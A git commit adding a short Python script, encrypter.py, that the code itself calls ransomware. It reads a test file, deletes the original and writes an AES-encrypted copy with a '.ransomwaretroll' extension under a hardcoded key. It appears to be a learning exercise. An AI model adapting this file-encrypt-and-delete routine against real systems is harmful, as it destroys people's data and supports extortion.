d3460f6da5a5157dde162c6c3299d5b59e728c0a
betoscl <83791969+betoscl@users.noreply.github.com>
2023-12-22 09:53:38 -0300

    Add files via upload

---
+++ encrypter.py
@@ -0,0 +1,28 @@
+import os
+import pyaes
+
+# Abrir arquivo a ser criptografado
+file_name = 'teste.txt'
+file = open (file_name, 'rb')
+file_data = file.read()
+file.close()
+
+# Remover o arquivo original
+os.remove (file_name)
+
+# Definir a chave de encriptação
+key = b"testeransomwares"
+aes = pyaes.AESModeOfOperationCTR(key)
+
+# Criptografar o arquivo
+crypto_data = aes.encrypt(file_data)
+
+# Salvar arquivo criptografado
+
+new_file = file_name + '.ransomwaretroll'
+new_file = open(f'{new_file}','wb')
+new_file.write(crypto_data)
+new_file.close()
+
+
+
